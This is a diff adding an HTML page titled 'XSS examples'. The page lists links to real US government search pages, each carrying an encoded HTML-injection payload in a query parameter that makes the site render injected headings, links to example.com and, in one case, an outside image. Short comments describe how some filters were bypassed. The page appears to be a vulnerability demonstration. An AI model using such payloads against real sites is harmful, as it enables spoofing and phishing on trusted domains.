@@ -1,0 +1,37 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>XSS examples</title>
+<meta name="robots" content="none" />
+
+<link href="/labs/a/css/global.css" rel="stylesheet" type="text/css" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+</head>
+<body>
+<div id="container">
+
+<ol>
+<li><a href="http://nlquery.epa.gov/epasearch/eparesults.jsp?datasource=MYDB&amp;textQuery=%3Ch1%3E%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E%3C/h1%3E&amp;resultsPerPage=10&amp;urlQuery=&amp;titleQuery=&amp;startDate=&amp;stopDate=&amp;sort=relevance">Environmental Protection Agency</a></li>
+<li><a href="http://www.fedworld.gov/cgi-bin/waisgate?WAISdbname=jobs%40odin.fedworld.gov&amp;WAISquerystring=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link.%3C%2Fa%3E&amp;stringop=ADJ&amp;2ndquerystring=&amp;statestring=&amp;waissort=score&amp;waismaxhits=10&amp;waistemplate=jobs%2Fnewjobs_508.html&amp;op1=and&amp;waisqueryrule=%28%24WAISquerystring+%24stringop+%242ndquerystring%29+AND+%28%24statestring%29+NOT+%28%24junk%29">United States Department of Commerce</a></li>
+<li><a href="http://search.nasa.gov/nasasearch/browse/browse.jsp?browsePath=ROOT%7E%22%3E%3Ch1%20style=%22font-size:%2020pt;%22%3E%3Ca%20href=%22http://www.example.com%22%3ELook,%20I%20made%20a%20link%3C/a%3E%3C/h1%3E%3Cinput%20type=%22hidden">NASA</a>&nbsp;- This one was a bit tricky, I had to throw in some extra markup to make sure the HTML that was rendered wasn't mangled.&nbsp; In the end I managed to get a link embedded inside a giant h1 tag. </li>
+<li><a href="http://memory.loc.gov/ammem/browse/ListSome.php?category=War,+Military%3Ch1%3ELook,%20I%20made%20content%20inside%20an%20h1%20tag%3C/h1%3E%3Ca%20href=http://www.example.com%3ELook,%20I%20made%20a%20link%3C/a%3E%3Cbr%20/%3E%3Cimg%20vspace=15%20hspace=15%20%20src=http://evil.seesaa.net/common/cat.gif%3E%3Cbr%20/%3E%3Ch1%3EKitties%20love%20links%3C/h1%3E">The Library of Congress</a> - I even added an image of a kitty wearing a watermelon helmet </li>
+<li><a href="http://www.sec.gov/cgi-bin/series?company=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;sc=companyseries&amp;ticker=&amp;CIK=&amp;type=N-PX">US Securities and Exchange Commission</a></li>
+<li><a href="http://www.leginfo.ca.gov/cgi-bin/postquery?sess=CUR&amp;house=B&amp;hits=All&amp;searchby=leginfo_bnumber&amp;searchfor=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;bnumber=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;member=&amp;search_term=">Official California Legislative Information</a></li>
+<li><a href="http://www.osha.gov/pls/oshaweb/searchresults.category?p_title=&amp;p_text=%3Ch1%3ELook%2C+I+made+a+giant+h1+tag%3C%2Fh1%3E%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3EIn+addition+to+making+a+link%3C%2Fa%3E">US Department of Labor&nbsp;</a></li>
+<li><a href="http://www-odi.nhtsa.dot.gov/cars/problems/recalls/results.cfm?rcl_id=%3Ch1%3E%3Ca%20href=%22http://www.example.com%22%3ELook,%20I%20made%20a%20link%3C/a%3E%3C/h1%3E&amp;Search=Search&amp;SearchType=QuickSearch&amp;summary=true">Office of Defects Investigation</a> - Their website is the only thing that's defective :) </li>
+<li><a href="http://search2.google.cit.nih.gov/search?site=NIH_Master&amp;client=NIH_frontend&amp;proxystylesheet=NIH_frontend&amp;output=xml_no_dtd&amp;filter=0&amp;getfields=*&amp;q=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E">National Institutes of Health</a></li>
+<li><a href="http://www.healthfinder.gov/search/default.asp?sort=date%253AD%253AL%253Ad1&amp;output=xml&amp;ie=UTF-8&amp;client=healthfinder2&amp;lr=lang_en&amp;numgm=5&amp;site=Federal%7Cnonprofit&amp;q=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E">US Dept of Health &amp; Human Services</a></li>
+<li><a href="https://www.sos.mo.gov/BusinessEntity/soskb/SearchResults.asp?FormName=CorpNameSearch&amp;Words=Starting&amp;SearchStr=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E">Missouri Secretary of State</a></li>
+<li><a href="http://www.dhs.ca.gov/applications/search/search.asp?advanced=yes&amp;appl_path=&amp;ct=dhs%2CRFP%2CRegulations%2CPressReleases%2CCMS%2CIZgroup%2CMCH%2COFP%2CPRH%2Cwic%2CHIPAA%2CHealthCommPortalInternet%2Cwic_manual&amp;q1=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E">California Department of Health Services</a></li>
+<li><a href="http://pvl.ehawaii.gov/pvlsearch/app?_f=lic&amp;lictp=&amp;licno=%22%3E%3Cbr+%2F%3E%3Ch1%3E%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E%3C%2Fh1%3E%3Cbr%3E%3Cbr%3E%3Cinput+type%3D%22&amp;_a=Submit+Query">Hawaii Department of Commerce and Consumer Affairs</a></li>
+<li><a href="http://idlastro.gsfc.nasa.gov/cgi-bin/idllibsrch?keyword=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E">IDL Astronomy Library Search</a></li>
+<li><a href="http://fms.treas.gov/scripts/search/?CiUserParam1=%22%3E%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E%3Cinput+type%3D%22text%22+foo%3D%22&amp;CiGroup=10&amp;CiUserParam2=&amp;CiUserParam3=&amp;CiUserParam4=&amp;CiScope=%2F&amp;lr=&amp;QryType=all&amp;CiFileTypeOption=i&amp;CiFileType=.html&amp;CiSort=rank&amp;Page=1">US Department of Treasury</a></li>
+<li><a href="http://www.legislature.ca.gov/cgi-bin/port-postquery?sess=CUR&amp;house=B&amp;hits=All&amp;searchby=leginfo_search&amp;searchfor=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;bnumber=&amp;member=&amp;search_term=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E">California State Legislature</a></li>
+<li><a href="http://search2.google.cit.nih.gov/search?client=GRANTS_ALL_frontend&amp;proxystylesheet=GRANTS_ALL_frontend&amp;output=xml_no_dtd&amp;filter=0&amp;getfields=*&amp;as_q=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;num=10&amp;as_epq=&amp;as_oq=&amp;as_eq=&amp;site=GRANTS_ALL%7CERA%7CELECTRONIC&amp;as_occt=any&amp;Search.x=0&amp;Search.y=0">Office of Extramural Research</a></li>
+<li><a href="http://www.health.gov/nhic/NHICScripts/newSrch.cfm?FieldName=OrgName&amp;Operator=contain&amp;SearchValue=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;SearchValue_required=You+must+enter+some+text+to+search+for.">Health Information Resource Database (health.gov)</a></li>
+<li><a href="http://zip4.usps.com/zip4/zcl_0_landing_error.jsp?firmname=&amp;address1=&amp;address2=%22%3E%3CH1%3E%3CA%20HREF=%22HTTP://WWW.EXAMPLE.COM%22%3ELOOK,%20I%20MADE%20A%20LINK%3C/A%3E%3C/H1%3E%3CSPAN%20STYLE=%22&amp;city=&amp;state=&amp;zip5=&amp;urbanization=">United States Postal Service</a>&nbsp; I had to jump through a few advanced forms before I found one I could use. </li>
+<li><a href="http://www.legis.nd.gov/dtsearch/dtsearch_paging.asp?cmd=search&amp;SearchForm=%25%25SearchForm%25%25&amp;request=%3Ca+href%3D%22http%3A%2F%2Fwww.example.com%22%3ELook%2C+I+made+a+link%3C%2Fa%3E&amp;index=%22e%3A%5CdtSearch%5CUserData%5Clr-all%22&amp;stemming=Yes&amp;maxFiles=25&amp;sort=Hits">North Dakota Legislative Branch</a></li>
+</ol>
+</div>
+</body>
+</html>
